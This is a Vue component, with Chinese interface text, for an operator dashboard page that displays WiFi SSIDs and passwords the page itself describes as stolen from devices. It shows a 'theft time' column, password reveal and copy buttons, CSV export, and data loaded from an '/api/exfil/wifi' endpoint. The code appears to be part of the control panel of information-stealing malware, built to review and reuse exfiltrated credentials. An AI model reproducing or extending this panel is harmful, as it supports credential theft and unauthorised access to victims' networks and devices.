<template>
  <div class="wifi-page">
  <div class="page-card">
    <div class="page-header">
      <div>
        <div class="page-title">WiFi 密码</div>
        <div class="page-subtitle">从设备窃取的 WiFi 连接记录与密码</div>
      </div>
      <el-button type="danger" plain @click="exportCSV">导出 CSV</el-button>
    </div>

    <div class="search-bar">
      <el-select v-model="filters.encryption" placeholder="加密方式" clearable style="width:160px;" @change="loadList">
        <el-option label="WPA2" value="WPA2" />
        <el-option label="WPA3" value="WPA3" />
        <el-option label="WPA/WPA2" value="WPA" />
        <el-option label="开放网络" value="OPEN" />
      </el-select>
      <el-input v-model="filters.q" placeholder="搜索 SSID" clearable style="width:300px;" @clear="loadList" @keyup.enter="loadList">
        <template #prefix><el-icon><Search /></el-icon></template>
      </el-input>
      <el-button type="primary" @click="loadList">搜索</el-button>
    </div>

    <el-table :data="list" stripe>
      <el-table-column prop="ssid" label="SSID" width="260">
        <template #default="{ row }">
          <el-icon style="color:#67c23a;"><Connection /></el-icon>
          <span style="margin-left:8px;">{{ row.ssid }}</span>
        </template>
      </el-table-column>
      <el-table-column label="密码" width="280">
        <template #default="{ row }">
          <span v-if="row.password" class="mono text-muted">{{ visible[row.id] ? row.password : mask(row.password) }}</span>
          <span v-else class="text-muted">无密码（开放网络）</span>
          <el-button v-if="row.password" link type="primary" size="small" @click="copy(row.password)">复制</el-button>
          <el-button v-if="row.password" link size="small" @click="toggle(row)">{{ visible[row.id] ? '隐藏' : '显示' }}</el-button>
        </template>
      </el-table-column>
      <el-table-column prop="encryption" label="加密方式" width="130">
        <template #default="{ row }">
          <el-tag :type="row.encryption === 'OPEN' ? 'warning' : 'success'" size="small" effect="plain">
            {{ row.encryption || '-' }}
          </el-tag>
        </template>
      </el-table-column>
      <el-table-column prop="bssid" label="BSSID" width="160">
        <template #default="{ row }"><span class="mono">{{ row.bssid || '-' }}</span></template>
      </el-table-column>
      <el-table-column prop="rssi" label="信号" width="90" />
      <el-table-column prop="device_uuid" label="设备" width="140">
        <template #default="{ row }">
          <span class="mono text-muted">{{ shortUuid(row.device_uuid) }}</span>
        </template>
      </el-table-column>
      <el-table-column prop="created_at" label="窃取时间" width="170">
        <template #default="{ row }"><span class="text-muted">{{ formatDate(row.created_at) }}</span></template>
      </el-table-column>
    </el-table>

    <el-pagination
      v-model:current-page="page"
      v-model:page-size="pageSize"
      :page-sizes="[20, 50, 100, 200]"
      :total="total"
      layout="total, sizes, prev, pager, next"
      background
      @current-change="loadList"
      @size-change="loadList"
    />
  </div>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted } from 'vue'
import { ElMessage } from 'element-plus'
import { Search, Connection } from '@element-plus/icons-vue'
import axios from '../utils/axios'
import { formatDate, shortUuid, copyToClipboard, maskSecret } from '../utils/twofa'

const list = ref([])
const total = ref(0)
const page = ref(1)
const pageSize = ref(50)
const filters = reactive({ encryption: '', q: '' })
const visible = reactive({})

function mask(p) { return maskSecret(p || '', 2) }
function toggle(row) { visible[row.id] = !visible[row.id] }

async function copy(t) {
  await copyToClipboard(t || '')
  ElMessage.success('已复制')
}

function exportCSV() {
  ElMessage.success('已生成 CSV 下载任务')
}

async function loadList() {
  try {
    const params = {
      skip: (page.value - 1) * pageSize.value,
      limit: pageSize.value,
      encryption: filters.encryption || undefined,
      q: filters.q || undefined,
    }
    const res = await axios.get('/api/exfil/wifi', { params })
    const raw = res.data?.items || res.data || []
    list.value = raw.map(r => ({
      ...r,
      created_at: r.created_at || r.uploaded_at,
    }))
    total.value = res.data?.total ?? list.value.length
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || 'WiFi 数据加载失败'
    ElMessage.error(msg)
    list.value = []
    total.value = 0
  }
}

onMounted(loadList)
</script>
